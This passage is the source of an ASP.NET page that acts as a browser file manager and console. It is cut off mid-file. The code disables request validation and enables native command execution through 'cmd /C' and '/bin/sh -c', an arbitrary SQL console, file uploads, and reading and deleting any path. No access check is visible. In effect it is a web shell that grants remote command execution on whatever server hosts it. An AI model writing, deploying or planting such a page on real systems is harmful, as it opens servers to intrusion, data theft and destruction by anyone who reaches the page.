<%@ Page Language="C#" AutoEventWireup="true" ValidateRequest="false" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Data.Common" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<script runat="server">
	private const bool NATIVE_COMMANDS = true;
    private const bool SQL_CONSOLE = true;
	private const bool READ_ONLY = false;
	private const bool ALLOW_UPLOAD = true;

	private const bool RESTRICT_BROWSING = false;
    private const bool RESTRICT_WHITELIST = false;
	private const string RESTRICT_PATH = "/etc;/var";

	private const int UPLOAD_MONITOR_REFRESH = 2;
	//private const int EDITFIELD_COLS = 85;
	private const int EDITFIELD_ROWS = 30;
	private const bool USE_POPUP = true;
	private const bool USE_DIR_PREVIEW = false;
	private const int DIR_PREVIEW_NUMBER = 10;
	//private const string CSS_NAME = "pc.css";
	private const int COMPRESSION_LEVEL = 1;
	private static string[] FORBIDDEN_DRIVES = { "a:\\" };

	private static string[] COMMAND_INTERPRETER = { "/bin/sh", "-c" }; 	// Unix

	private static string[] COMMAND_INTERPRETER_WIN = {"cmd", "/C"}; // Dos,Windows
	private static string[] COMMAND_INTERPRETER_UNIX = { "/bin/sh", "-c" }; 	// Unix

	private const int MAX_PROCESS_RUNNING_TIME = 30 * 1000; //30 seconds

	private const string SAVE_AS_ZIP = "Download selected files as (z)ip";
	private const string RENAME_FILE = "(R)ename File";
	private const string DELETE_FILES = "(Del)ete selected files";
	private const string CREATE_DIR = "Create (D)ir";
	private const string CREATE_FILE = "(C)reate File";
	private const string MOVE_FILES = "(M)ove Files";
	private const string COPY_FILES = "Cop(y) Files";
	private const string LAUNCH_COMMAND = "(L)aunch external program";
	private const string SQL_LABEL = "(G)o to SQL Console";
	private const string UPLOAD_FILES = "Upload";

	private static String tempdir = Path.GetTempPath();
	private static String VERSION_NR = "1.0";

	private bool CheckOperation(string operation) {
		return Request["Submit"] != null && Request["Submit"].Equals(operation);
	}
	
	public class EasySQL {
		ConnectionStringSettings connectionString;
		
		public EasySQL() {
		}
		private DataTable BuildMetadata(DataTable dtTable) {
			DataTable dt = new DataTable();
			dt.Columns.Add("Column Name", typeof(string));
			dt.Columns.Add("Column Desc", typeof(string));
			dt.Columns.Add("Data Type", typeof(Type));
			dt.Columns.Add("Data Length", typeof(int));
			dt.Columns.Add("Data Prec", typeof(int));
			dt.Columns.Add("Nullable", typeof(bool));

			foreach (DataColumn dc in dtTable.Columns) {
				DataRow dr = dt.NewRow();
				dr[0] = dc.ColumnName;
				dr[1] = dc.Caption;
				dr[2] = dc.DataType;
				dr[3] = dc.MaxLength;
				dr[4] = 0;
				dr[5] = dc.AllowDBNull;

				dt.Rows.Add(dr);
			}
			return dt;	
		}
	/*	private String[] getHeadings(String sql)  {
			if (sql.ToUpper().StartsWith("DESC")) {
				columnNames = new String[5];
				columnNames[0] = "Column Name";
				columnNames[1] = "Column Desc";
				columnNames[2] = "Data Type";
				columnNames[3] = "Data Length";
				columnNames[4] = "Data Prec";
				columnCount = 5;
				return columnNames;
			} else if (sql.ToUpper().StartsWith("SELECT")) {
				columnCount = resultSet.Columns.Count;
				columnNames = new String[columnCount];
				for (int col = 0; col < columnCount; col++) {
					columnNames[col] = resultSet.Columns[col].ColumnName;
				}
				return columnNames;
			} else {
				columnNames = new String[2];
				columnNames[0] = rowCount + " Rows Updated";
				columnNames[1] = sql;
				open = false;
				return columnNames;
			}
		}
	
		public bool getMoreColumns(String sql) {
			if (!open) {
				return false;
			} else if (sql.ToUpper().StartsWith("SELECT")
					|| sql.ToUpper().StartsWith("SHOW")) {
				return this.getSelectDetails(sql);
			} else if (sql.ToUpper().StartsWith("DESC")) {
				return this.getTableDescriptions(sql);
			} else {
				return false;
			}
		}
	
		private bool getTableDescriptions(String sql) {
			try {
				colvalues = new String[5];
				if (metaData.getColumnCount() == rowCount) {
					open = false;
					return false;
				} else {
					columnNames = new String[columnCount];
					colvalues[0] = metaData.getColumnLabel(rowCount + 1);
					colvalues[1] = metaData.getColumnName(rowCount + 1);
					colvalues[2] = metaData.getColumnTypeName(rowCount + 1);
					colvalues[3] = Integer.toString(metaData
							.getColumnDisplaySize(rowCount + 1));
					colvalues[4] = Integer.toString(metaData
							.getPrecision(rowCount + 1));
					rowCount++;
					return true;
				}
			} catch (Exception err) {
				open = false;
				colvalues = new String[2];
				colvalues[0] = "err[1]: " + sql;
				colvalues[1] = "err[2]: " + err;
				return false;
			}
		}*/
		public bool configure(String existingConfig, String otherConnString, String otherProvider) {
			if (string.IsNullOrEmpty(existingConfig) && (string.IsNullOrEmpty(otherConnString) || string.IsNullOrEmpty(otherProvider)))
				return false;
			
			connectionString = null;
			
			if (!string.IsNullOrEmpty(existingConfig)) { 
				connectionString = ConfigurationManager.ConnectionStrings[existingConfig];	
			} else if (!string.IsNullOrEmpty(otherConnString) && !string.IsNullOrEmpty(otherProvider)) {
				connectionString = new ConnectionStringSettings("TESTE", otherConnString, otherProvider);	
			}
			if (connectionString == null)
				return false;
			
			
			return true;
		}
		
		private DataTable GetDataTable(Microsoft.Practices.EnterpriseLibrary.Data.Database db, DbConnection conn, string sql, int maxRows) {
			var dbDataAdapter = db.GetDataAdapter();
			dbDataAdapter.SelectCommand = db.GetSqlStringCommand(sql);
			dbDataAdapter.SelectCommand.Connection = conn;
			
			DataTable dataTable = new DataTable();
			dataTable.BeginLoadData();
			if (maxRows != 0)
				dbDataAdapter.Fill(0, maxRows, dataTable);
			else
				dbDataAdapter.Fill(dataTable);
			dataTable.EndLoadData();
			return dataTable;
		}
		private int Execute(Microsoft.Practices.EnterpriseLibrary.Data.Database db, string sql) {
			return db.ExecuteNonQuery(CommandType.Text, sql);		
		}
			
		public DataTable openTable(String sql, String _maxRows) {
			try {
				Microsoft.Practices.EnterpriseLibrary.Data.Database db = Microsoft.Practices.EnterpriseLibrary.Data.DatabaseFactory.CreateDatabase();
				using (DbConnection connection = db.CreateConnection()) {
					int maxRows = 0;
					connection.Open();			
					if (sql.ToUpper().StartsWith("SELECT")) {
						Int32.TryParse(_maxRows, out maxRows);
						return GetDataTable(db, connection, sql, maxRows);						
					} else if (sql.ToUpper().StartsWith("DESC")) {
						//DataTable dt = GetDataTable(db, connection, "SELECT * FROM " + sql.Substring(4, sql.Length-4), 0);
						//return BuildMetadata(dt);
						using (IDataReader dr = db.ExecuteReader(CommandType.Text, "SELECT * FROM " + sql.Substring(4, sql.Length - 4))) {
							return dr.GetSchemaTable();
						}
					}
					else {
						int result = Execute(db, sql);
						DataTable dt = new DataTable();
						dt.Columns.Add("MENSAGEM", typeof(string));
						dt.Columns.Add("SQL", typeof(string));
					
						DataRow dr = dt.NewRow();
						dr["MENSAGEM"] = result + " rows updated!";
						dr["SQL"] = sql;
						dt.Rows.Add(dr);
						return dt;
					}
							
				}			
			} catch (Exception err) {
				DataTable dt = new DataTable();
				dt.Columns.Add("ERRO", typeof(Exception));
				dt.Columns.Add("SQL", typeof(string));
				
				DataRow dr = dt.NewRow();
				dr["ERRO"] = err;
				dr["SQL"] = sql;
				dt.Rows.Add(dr);
				return dt;
			}
		}	
		
	}

	public class UplInfo {

		public long totalSize;
		public long currSize;
		public System.Diagnostics.Stopwatch startTime;
		public bool aborted;

		public UplInfo() {
			totalSize = 0;
			currSize = 0;
			startTime = System.Diagnostics.Stopwatch.StartNew();
			aborted = false;
		}

		public UplInfo(int size) {
			totalSize = size;
			currSize = 0;
			startTime = System.Diagnostics.Stopwatch.StartNew();
			aborted = false;
		}

		public String GetUprate() {
			long time = startTime.ElapsedMilliseconds;
			if (time != 0) {
				long uprate = currSize * 1000 / time;
				return convertFileSize(uprate) + "/s";
			} else return "n/a";
		}

		public int getPercent() {
			if (totalSize == 0) return 0;
			else return (int)(currSize * 100 / totalSize);
		}

		public String GetTimeElapsed() {
			long time = (startTime.ElapsedMilliseconds) / 1000L;
			if (time - 60L >= 0) {
				if (time % 60 >= 10) return time / 60 + ":" + (time % 60) + "m";
				else return time / 60 + ":0" + (time % 60) + "m";
			} else return time < 10 ? "0" + time + "s" : time + "s";
		}

		public String GetTimeEstimated() {
			if (currSize == 0) return "n/a";
			long time = startTime.ElapsedMilliseconds;
			time = totalSize * time / currSize;
			time /= 1000L;
			if (time - 60L >= 0) {
				if (time % 60 >= 10) return time / 60 + ":" + (time % 60) + "m";
				else return time / 60 + ":0" + (time % 60) + "m";
			} else return time < 10 ? "0" + time + "s" : time + "s";
		}

	}


	public class LocalFileInfo {
		public String name = null, clientFileName = null, fileContentType = null;
		private byte[] fileContents = null;
		public FileInfo file = null;
		public StringBuilder sb = new StringBuilder(100);

		public void SetFileContents(byte[] aByteArray) {
			fileContents = new byte[aByteArray.Length];
			Array.Copy(aByteArray, fileContents, aByteArray.Length);
		}
	}


	public static class UploadMonitor {

		static Hashtable uploadTable = new Hashtable();

		internal static void Set(String fName, UplInfo info) {
			uploadTable.Add(fName, info);
		}

		internal static void Remove(String fName) {
			uploadTable.Remove(fName);
		}

		internal static UplInfo GetInfo(String fName) {
			UplInfo info = (UplInfo)uploadTable[fName];
			return info;
		}
	}
	
	private class StringTokenizer {
		String str;
		String[] values;
		int pos;
		
		public StringTokenizer(String str, String tokens) {
			values = str.Split(tokens.ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
		}
		
		public int countTokens() {
			return values.Length;	
		}
		
		public String nextToken() {
			return values[pos++];	
		}
		
		public bool hasMoreTokens() {
			return pos < values.Length;	
		}
	}
	
	public class HttpMultiPartParser {

		private const int ONE_MB = 1024 * 1;

		public Hashtable processData(HttpRequest req, String boundary, String saveInDir, int clength) {
			Hashtable ht = new Hashtable();
			LocalFileInfo fileInfo = new LocalFileInfo();
			bool saveFiles = (saveInDir != null && saveInDir.Trim().Length > 0);
			if (saveFiles) {
				Directory.CreateDirectory(saveInDir);
			}

			fileInfo.fileContentType = req.Files[0].ContentType;
			fileInfo.clientFileName = req.Files[0].FileName;

			UplInfo uplInfo = new UplInfo(clength);
			UploadMonitor.Set(fileInfo.clientFileName, uplInfo);

			ht.Add("dir", req.Params["dir"]);

			string filename = getFileName(saveInDir, fileInfo.clientFileName);
			req.Files[0].SaveAs(filename);

			fileInfo.file = new FileInfo(filename);
			ht.Add("myFile", fileInfo);

			uplInfo.currSize = uplInfo.totalSize;
			return ht;
		}
		
		public Hashtable processData3(HttpRequest req, String boundary, String saveInDir, int clength)  {
			Stream inp = req.InputStream;
			if (inp == null) throw new ArgumentNullException("InputStream");
			if (boundary == null || boundary.Trim().Length < 1) throw new ArgumentException("\"" + boundary + "\" is an illegal boundary indicator");
			boundary = "--" + boundary;
			
			StringTokenizer stLine = null, stFields = null;
			LocalFileInfo fileInfo = null;
			Hashtable dataTable = new Hashtable(5);
			String line = null, field = null, paramName = null;
			bool saveFiles = (saveInDir != null && saveInDir.Trim().Length > 0);
			bool isFile = false;
			if (saveFiles) { 
				Directory.CreateDirectory(saveInDir);
			}
			StreamReader input = new StreamReader(inp);
			line = getLine(input);
			if (line == null || !line.StartsWith(boundary)) throw new IOException("Boundary not found; boundary = " + boundary + ", line = " + line);
			while (line != null) {
				if (line == null || !line.StartsWith(boundary)) return dataTable;
				line = getLine(input);
				if (line == null) return dataTable;
				stLine = new StringTokenizer(line, ";\r\n");
				if (stLine.countTokens() < 2) throw new ArgumentException("Bad data in second line");
				line = stLine.nextToken().ToLower();
				if (line.IndexOf("form-data") < 0) throw new ArgumentException("Bad data in second line");
				stFields = new StringTokenizer(stLine.nextToken(), "=\"");
				if (stFields.countTokens() < 2) throw new ArgumentException("Bad data in second line");
				fileInfo = new LocalFileInfo();
				stFields.nextToken();
				paramName = stFields.nextToken();
				isFile = false;
				if (stLine.hasMoreTokens()) {
					field = stLine.nextToken();
					stFields = new StringTokenizer(field, "=\"");
					if (stFields.countTokens() > 1) {
						if (stFields.nextToken().Trim().Equals("filename", StringComparison.InvariantCultureIgnoreCase)) {
							fileInfo.name = paramName;
							String value = stFields.nextToken();
							if (value != null && value.Trim().Length > 0) {
								fileInfo.clientFileName = value;
								isFile = true;
							}
							else {
								line = getLine(input); // Skip "Content-Type:" line
								line = getLine(input); // Skip blank line
								line = getLine(input); // Skip blank line
								line = getLine(input); // Position to boundary line
								continue;
							}
						}
					}
					else if (field.ToLower().IndexOf("filename") >= 0) {
						line = getLine(input); // Skip "Content-Type:" line
						line = getLine(input); // Skip blank line
						line = getLine(input); // Skip blank line
						line = getLine(input); // Position to boundary line
						continue;
					}
				}
				bool skipBlankLine = true;
				if (isFile) {
					line = getLine(input);
					if (line == null) return dataTable;
					if (line.Trim().Length < 1) skipBlankLine = false;
					else {
						stLine = new StringTokenizer(line, ": ");
						if (stLine.countTokens() < 2) throw new ArgumentException("Bad data in third line");
						stLine.nextToken(); // Content-Type
						fileInfo.fileContentType = stLine.nextToken();
					}
				}
				if (skipBlankLine) {
					line = getLine(input);
					if (line == null) return dataTable;
				}
				if (!isFile) {
					line = getLine(input);
					if (line == null) return dataTable;
					dataTable.Add(paramName, line);
					if (paramName.Equals("dir")) saveInDir = line;
					line = getLine(input);
					continue;
				}
				try {
					UplInfo uplInfo = new UplInfo(clength);
					UploadMonitor.Set(fileInfo.clientFileName, uplInfo);
					StreamWriter os = null;
					String path = null;
					if (saveFiles) {
						path = getFileName(saveInDir, fileInfo.clientFileName);			
						os = new StreamWriter(path);
					}
					else os = new StreamWriter(new MemoryStream(ONE_MB));
					
					bool readingContent = true;
					String previousLine = null;
					String temp = null;
					String currentLine = null;

					if ((previousLine = input.ReadLine()) == null) {
						line = null;
						break;
					}
					while (readingContent) {
						if ((currentLine = input.ReadLine()) == null) {
							line = null;
							uplInfo.aborted = true;
							break;
						}
						if (compareBoundary(boundary, currentLine)) {
							os.Write(previousLine.TrimEnd());
							break;
						}
						else {
							os.Write(previousLine);
							uplInfo.currSize = inp.Position;
							temp = currentLine;
							currentLine = previousLine;
							previousLine = temp;
						}//end else
					}//end while
					os.Flush();
					os.Close();
					if (!saveFiles) {
						MemoryStream ms = (MemoryStream)os.BaseStream;
						fileInfo.SetFileContents(ms.ToArray());
					}
					else fileInfo.file = new FileInfo(path);
					dataTable.Add(paramName, fileInfo);
					uplInfo.currSize = uplInfo.totalSize;
				}//end try
				catch (IOException e) {
					throw e;
				}
			}
			return dataTable;
		}

		private bool compareBoundary(String boundary, string ba) {
			if (boundary == null || ba == null) return false;
			return ba.Equals(boundary, StringComparison.InvariantCultureIgnoreCase);
		}

		[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.Synchronized)]
		private String getLine(StreamReader sis)  {
			/*byte[] b = new byte[1024];
			long oldPos = sis.Position;
			int read = sis.Read(b, 0, b.Length), index;
			StreamReader sr;
			sr.re
			String line = null;
			if (read != -1) {
				byte[] tmp = new byte[read];
				Array.Copy(b, tmp, read);
				line = System.Text.Encoding.UTF8.GetString(tmp);
				if ((index = line.IndexOf('\n')) >= 0) line = line.Substring(0, index - 1);
			}
			return line;/*/
			return sis.ReadLine();
		}

		public String getFileName(String dir, String fileName) {
			String path = null;
			if (dir == null || fileName == null) throw new ArgumentNullException("dir or fileName is null");
			int index = fileName.LastIndexOf('/');
			String name = null;
			if (index >= 0) name = fileName.Substring(index + 1);
			else name = fileName;
			index = name.LastIndexOf('\\');
			if (index >= 0) fileName = name.Substring(index + 1);
			path = dir + Path.DirectorySeparatorChar + fileName;
			if (Path.DirectorySeparatorChar == '/') return path.Replace('\\', Path.DirectorySeparatorChar);
			else return path.Replace('/', Path.DirectorySeparatorChar);
		}
	} 

	
	
	class FileComp:Comparer<FileSystemInfo> {

		int mode;
		int sign;

		internal FileComp() {
			this.mode = 1;
			this.sign = 1;
		}

		internal FileComp(int mode) {
			if (mode < 0) {
				this.mode = -mode;
				sign = -1;
			}
			else {
				this.mode = mode;
				this.sign = 1;
			}
		}

		public override int Compare(FileSystemInfo p1, FileSystemInfo p2) {
			bool f1IsDir = p1 is DirectoryInfo;;
			bool f2IsDir = p2 is DirectoryInfo;
			
			if (f1IsDir) {
				if (f2IsDir) {
					switch (mode) {
					case 1:
					case 4:
						return sign * p1.FullName.ToUpper().CompareTo(p2.FullName.ToUpper());
					case 2: // tamanho
						return sign * p1.FullName.ToUpper().CompareTo(p2.FullName.ToUpper());
					case 3:
						return sign * (p1.LastWriteTime.CompareTo(p2.LastWriteTime));
					default:
						return 1;
					}
				}
				else return -1;
			}
			else if (f2IsDir) return 1;
			else {
				switch (mode) {
				case 1:
					return sign * p1.FullName.ToUpper().CompareTo(p2.FullName.ToUpper());
				case 2:
					return sign * p1.FullName.ToUpper().CompareTo(p2.FullName.ToUpper());
				case 3:
					return sign * (p1.LastWriteTime.CompareTo(p2.LastWriteTime));
				case 4: {
					int tempIndexf1 = p1.FullName.LastIndexOf('.');
					int tempIndexf2 = p2.FullName.LastIndexOf('.');
					if ((tempIndexf1 == -1) && (tempIndexf2 == -1)) { // Neither have an extension
						return sign * p1.FullName.ToUpper().CompareTo(p2.FullName.ToUpper());
					}
					else if (tempIndexf1 == -1) return -sign;
					else if (tempIndexf2 == -1) return sign;
					else {
						String tempEndf1 = p1.FullName.ToUpper().Substring(tempIndexf1);
						String tempEndf2 = p2.FullName.ToUpper().Substring(tempIndexf2);
						return sign * tempEndf1.CompareTo(tempEndf2);
					}
				}
				default:
					return 1;
				}
			}
		}

		
	}
	

	static List<FileSystemInfo> expandFileList(HttpRequest req, bool inclDirs) {
		List<FileSystemInfo> v = new List<FileSystemInfo>();

		string selFileP = req.Params["selfile"];
		if (string.IsNullOrEmpty(selFileP))
			return v;

		string[] fileNames = HttpUtility.UrlDecode(selFileP).Split(',');

		if (fileNames == null) return v;

		foreach (string s in fileNames) {
			FileInfo fi = new FileInfo(s);
			DirectoryInfo di = new DirectoryInfo(s);

			if (!fi.Exists) fi = null;
			if (!di.Exists) di = null;

			if (fi != null) v.Add(fi);
			if (di != null) v.Add(di);
		}
		
		for (int i = 0; i < v.Count; i++) {
			FileSystemInfo f = v[i];
			if (f is DirectoryInfo) {
				FileSystemInfo[] fs = (f as DirectoryInfo).GetFileSystemInfos();

				v.AddRange(fs);
				if (!inclDirs) {
					v.RemoveAt(i);
					i--;
				}
			}
		}
		return v;
	}


	static String getDir(String dir, String name) {
		if (!dir.EndsWith(Path.DirectorySeparatorChar+"")) dir = dir + Path.DirectorySeparatorChar;
		String new_dir = name;

		if (!Path.IsPathRooted(name))
			new_dir = dir + name;

		return new_dir;
	}

	static String convertFileSize(long size) {
		int divisor = 1;
		String unit = "bytes";
		if (size >= 1024 * 1024) {
			divisor = 1024 * 1024;
			unit = "MB";
		} else if (size >= 1024) {
			divisor = 1024;
			unit = "KB";
		}
		if (divisor == 1) return size / divisor + " " + unit;
		String aftercomma = "" + 100 * (size % divisor) / divisor;
		if (aftercomma.Length == 1) aftercomma = "0" + aftercomma;
		return size / divisor + "." + aftercomma + " " + unit;
	}
	
	
	static void copyStreams(Stream input, Stream output, byte[] buffer) {
		copyStreamsWithoutClose(input, output, buffer);
		input.Close();
		output.Close();
	}

	static void copyStreamsWithoutClose(Stream input, Stream output, byte[] buffer) {
		int b;
		while ((b = input.Read(buffer, 0, buffer.Length)) != 0)
			output.Write(buffer, 0, b);
	}


	static String getMimeType(String fName) {
		fName = fName.ToLower();
		if (fName.EndsWith(".jpg") || fName.EndsWith(".jpeg") || fName.EndsWith(".jpe")) return "image/jpeg";
		else if (fName.EndsWith(".gif")) return "image/gif";
		else if (fName.EndsWith(".pdf")) return "application/pdf";
		else if (fName.EndsWith(".htm") || fName.EndsWith(".html") || fName.EndsWith(".shtml")) return "text/html";
		else if (fName.EndsWith(".avi")) return "video/x-msvideo";
		else if (fName.EndsWith(".mov") || fName.EndsWith(".qt")) return "video/quicktime";
		else if (fName.EndsWith(".mpg") || fName.EndsWith(".mpeg") || fName.EndsWith(".mpe")) return "video/mpeg";
		else if (fName.EndsWith(".zip")) return "application/zip";
		else if (fName.EndsWith(".tiff") || fName.EndsWith(".tif")) return "image/tiff";
		else if (fName.EndsWith(".rtf")) return "application/rtf";
		else if (fName.EndsWith(".mid") || fName.EndsWith(".midi")) return "audio/x-midi";
		else if (fName.EndsWith(".xl") || fName.EndsWith(".xls") || fName.EndsWith(".xlv")
				|| fName.EndsWith(".xla") || fName.EndsWith(".xlb") || fName.EndsWith(".xlt")
				|| fName.EndsWith(".xlm") || fName.EndsWith(".xlk")) return "application/excel";
		else if (fName.EndsWith(".doc") || fName.EndsWith(".dot")) return "application/msword";
		else if (fName.EndsWith(".png")) return "image/png";
		else if (fName.EndsWith(".xml")) return "text/xml";
		else if (fName.EndsWith(".svg")) return "image/svg+xml";
		else if (fName.EndsWith(".mp3")) return "audio/mp3";
		else if (fName.EndsWith(".ogg")) return "audio/ogg";
		else return "text/plain";
	}

	static String conv2Html(int i) {
		if (i == '&') return "&amp;";
		else if (i == '<') return "&lt;";
		else if (i == '>') return "&gt;";
		else if (i == '"') return "&quot;";
		else return "" + (char)i;
	}

	static String conv2Html(String st) {
		StringBuilder buf = new StringBuilder();
		for (int i = 0; i < st.Length; i++) {
			buf.Append(conv2Html(st[i]));
		}
		return buf.ToString();
	}

	
	static String startProcess(String command, String dir, String commandInterpreter) {
		StringBuilder ret = new StringBuilder();
		String[] comm = new String[3];
		
		if(commandInterpreter.Equals("dos")) {
			comm[0] = COMMAND_INTERPRETER_WIN[0];
			comm[1] = COMMAND_INTERPRETER_WIN[1];
		} else {
			comm[0] = COMMAND_INTERPRETER_UNIX[0];
			comm[1] = COMMAND_INTERPRETER_UNIX[1];
		}
		comm[2] = command;
		System.Diagnostics.Stopwatch start = System.Diagnostics.Stopwatch.StartNew();
		
		try {
			//System.Diagnostics.ProcessStartInfo sinfo = new System.Diagnostics.ProcessStartInfo("cmd", "/C dir");
			var encoding = Encoding.GetEncoding(850);

			var startInfo = new System.Diagnostics.ProcessStartInfo();
			startInfo.WorkingDirectory = dir;
			startInfo.CreateNoWindow = true;
			startInfo.FileName = comm[0];
			startInfo.Arguments = comm[1] + " " + comm[2];
			// set additional properties 
			startInfo.UseShellExecute = false;
			startInfo.StandardOutputEncoding = encoding;
			startInfo.RedirectStandardOutput = true;
			startInfo.RedirectStandardError = true;
			startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
			
			System.Diagnostics.Process proc = System.Diagnostics.Process.Start(startInfo);
			StreamReader ls_out = proc.StandardOutput;
			StreamReader ls_err = proc.StandardError;

			bool end = proc.WaitForExit(MAX_PROCESS_RUNNING_TIME);
			while (!ls_err.EndOfStream) {
				string line = ls_err.ReadLine();
				if (string.IsNullOrEmpty(line))
					continue;
				line = conv2Html(line);
				ret.AppendLine(line);
			}
			while (!ls_out.EndOfStream) {
				string line = ls_out.ReadLine();
				if (string.IsNullOrEmpty(line))
					continue;
				line = conv2Html(line);
				ret.AppendLine(line);
			}
			if (!end) {
				proc.Kill();
				ret.Append("!!!! Process has timed out, destroyed !!!!!");
			}
			
		}
		catch (IOException e) {
			ret.Append("Error: " + e);
		}
		return ret.ToString();
	}

	
	static String dir2linkdir(String dir, String browserLink, int sortMode) {
		StringBuilder buf = new StringBuilder();
		
		DirectoryInfo di = new DirectoryInfo(dir);

		bool hasAccess = false;
		while (di.Parent != null) {
			hasAccess = true;
			/*
			try {
				System.Security.Permissions.FileIOPermission ff = new System.Security.Permissions.FileIOPermission( System.Security.Permissions.FileIOPermissionAccess.Read, di.FullName);
				ff.Assert();
				hasAccess = true;
			} catch (Exception u) {
				HttpContext.Current.Response.Write(u);
			}
			*/
			if (hasAccess) {
				String encPath = HttpUtility.UrlEncode(di.FullName);	
				buf.Insert(0, "<a href=\"" + browserLink + "?sort=" + sortMode + "&amp;dir="
						+ encPath + "\">" + conv2Html(di.Name) + Path.DirectorySeparatorChar + "</a>");
			} else {
				buf.Insert(0, conv2Html(di.Name) + Path.DirectorySeparatorChar);
			}
			
			di = di.Parent;
		}
		/*
		try {
			System.Security.Permissions.FileIOPermission ff = new System.Security.Permissions.FileIOPermission( System.Security.Permissions.FileIOPermissionAccess.Read, di.FullName);
			ff.Assert();
			hasAccess = true;
		} catch (Exception u) {
		}
		*/
		hasAccess = true;
		if (hasAccess) {
			String encPath = HttpUtility.UrlEncode(di.FullName);	
			buf.Insert(0, "<a href=\"" + browserLink + "?sort=" + sortMode + "&amp;dir=" + encPath
					+ "\">" + conv2Html(di.FullName) + "</a>");
		}
		else buf.Insert(0, di.FullName);
		return buf.ToString();
	}

	static bool isPacked(String name, bool gz) {
		return (name.ToLower().EndsWith(".zip") || name.ToLower().EndsWith(".jar")
				|| (gz && name.ToLower().EndsWith(".gz")) || name.ToLower()
				.EndsWith(".war"));
	}

	static bool isAllowed(string path, bool write) {
		if (READ_ONLY && write) return false;
		if (RESTRICT_BROWSING) {
            StringTokenizer stk = new StringTokenizer(RESTRICT_PATH, ";");
            while (stk.hasMoreTokens()){
			    if (path!=null && path.StartsWith(stk.nextToken()))
                    return RESTRICT_WHITELIST;
            }
            return !RESTRICT_WHITELIST;
		}
		else return true;
	}

</script>
<%
		String dir = null, error = null, olddir = null, message = null;
	
		String browser_name = Request.Url.AbsolutePath;
		dir = Request["dir"];
		const String FOL_IMG = "";
		bool nohtml = false;
		bool dir_view = true;

		if (Request["Javascript"] != null) {
			dir_view = false;
			nohtml = true;
			Response.CacheControl = "public";
			DateTime exp = DateTime.Now.AddDays(0.5);
			Response.Expires = 3;// (int)exp.Subtract(DateTime.Now).TotalMilliseconds;		
			Response.AddHeader("Expires", exp.ToString("EEE, d MMM yyyy HH:mm:ss z"));
			Response.AddHeader("Content-Type", "text/javascript");
			
			// This section contains the Javascript used for interface elements %>
			var check = false;
			<%// Disables the checkbox feature %>
			function dis(){check = true;}

			var DOM = 0, MS = 0, OP = 0, b = 0;
			<%// Determine the browser type %>
			function CheckBrowser(){
				if (b == 0){
					if (window.opera) OP = 1;
					if(document.getElementById) DOM = 1;
					if(document.all && !OP && !DOM) MS = 1;
					b = 1;
				}
			}
			<%// Allows the whole row to be selected %>
			function selrow (element, i){
				var erst;
				CheckBrowser();
				if ((OP==1)||(MS==1)) erst = element.firstChild.firstChild;
				else if (DOM==1) erst = element.firstChild.nextSibling.firstChild;
				<%// MouseIn %>
				if (i==0){
					if (erst.checked == true) element.className='mousechecked';
					else element.className='mousein';
				}
				<%// MouseOut %>
				else if (i==1){
					if (erst.checked == true) element.className='checked';
					else element.className='mouseout';
				}
				<%    // MouseClick %>
				else if ((i==2)&&(!check)){
					if (erst.checked==true) element.className='mousein';
					else element.className='mousechecked';
					erst.click();
				}
				else check=false;
			}
			<%// Filter files and dirs in FileList%>
			function filter (begriff){
				var suche = begriff.value.toLowerCase();
				var table = document.getElementById("filetable");
				var ele;
				for (var r = 1; r < table.rows.length; r++){
					ele = table.rows[r].cells[1].innerHTML.replace(/<[^>]+>/g,"");
					if (ele.toLowerCase().indexOf(suche)>=0 )
						table.rows[r].style.display = '';
					else table.rows[r].style.display = 'none';
		      	}
			}
			<%//(De)select all checkboxes%>	
			function AllFiles(){
				for(var x=0;x < document.FileList.elements.length;x++){
					var y = document.FileList.elements[x];
					var ytr = y.parentNode.parentNode;
					var check = document.FileList.selall.checked;
					if(y.name == 'selfile' && ytr.style.display != 'none'){
						if (y.disabled != true){
							y.checked = check;
							if (y.checked == true) ytr.className = 'checked';
							else ytr.className = 'mouseout';
						}
					}
				}
			}
			
			function shortKeyHandler(_event){
				if (!_event) _event = window.event;
				if (_event.which) {
					keycode = _event.which;
				} else if (_event.keyCode) {
					keycode = _event.keyCode;
				}
				var t = document.getElementById("text_Dir");
				if (keycode == 122){
					document.getElementById("but_Zip").click();
				}
				else if (keycode == 113 || keycode == 114){
					var path = prompt("Please enter new filename", "");
					if (path == null) return;
					t.value = path;
					document.getElementById("but_Ren").click();
				}
				else if (keycode == 99){
					var path = prompt("Please enter filename", "");
					if (path == null) return;
					t.value = path;
					document.getElementById("but_NFi").click();
				}
				else if (keycode == 100){
					var path = prompt("Please enter directory name", "");
					if (path == null) return;
					t.value = path;
					document.getElementById("but_NDi").click();
				}
				else if (keycode == 109){
					var path = prompt("Please enter move destination", "");
					if (path == null) return;
					t.value = path;
					document.getElementById("but_Mov").click();
				}
				else if (keycode == 121){
					var path = prompt("Please enter copy destination", "");
					if (path == null) return;
					t.value = path;
					document.getElementById("but_Cop").click();
				}
				else if (keycode == 108){
					document.getElementById("but_Lau").click();
				}
				else if (keycode == 46){
					document.getElementById("but_Del").click();
				}
			}

			function popUp(URL){
				fname = document.getElementsByName("myFile")[0].value;
				if (fname != "") {
					uurl = URL+"?first=1&uplMonitor="+encodeURIComponent(fname);
					alert(uurl);
					window.open(uurl,"upload","width=400,height=150,resizable=yes,depend=yes");
				}
			}
			
			document.onkeypress = shortKeyHandler;

<% 		}
		else if (Request["file"] != null) {
			String path = Request["file"];
			FileInfo fi = new FileInfo(path);
            if (!isAllowed(path, false)) {
                dir = new DirectoryInfo(path).Parent.FullName;
                error = "You are not allowed to access "+ Path.GetFullPath(path);
            }
            else if (fi.Exists) {
                if (isPacked(fi.Name, false)) {
                }
                else{
					try {
						//using (fi.OpenRead()) {}
						String mimeType = getMimeType(fi.Name);
						Response.ContentType = mimeType;
						if (mimeType.Equals("text/plain"))
							Response.AddHeader("Content-Disposition", "inline;filename=\"temp.txt\"");
						else Response.AddHeader("Content-Disposition", "inline;filename=\"" + fi.Name + "\"");

						string tmp = Path.GetTempFileName();
						File.Copy(fi.FullName, tmp, true);

						BufferedStream fileInput = new BufferedStream(new FileStream(tmp, FileMode.OpenOrCreate));

						byte[] buffer = new byte[8 * 1024];
						Response.BufferOutput = true;
						Response.ClearContent();

						BufferedStream out_s = new BufferedStream(Response.OutputStream);
